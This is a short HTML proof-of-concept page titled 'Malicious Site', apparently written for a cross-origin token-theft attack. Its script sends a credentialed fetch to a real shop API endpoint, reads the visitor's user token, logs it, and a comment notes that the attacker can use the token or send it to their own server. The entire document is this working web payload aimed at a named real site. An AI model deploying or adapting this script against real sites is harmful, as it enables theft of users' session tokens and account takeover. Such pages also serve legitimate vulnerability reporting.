<!DOCTYPE html>
<html>
<head>
    <title>Malicious Site</title>
</head>
<body>
    <script>
        fetch('https://shop.porsche.com/api/user-token', {
            credentials: 'include'
        })
        .then(response => response.json())
        .then(data => {
            console.log('User Token:', data.userToken);
            // Attacker can now use the token or send it to their server
        })
        .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
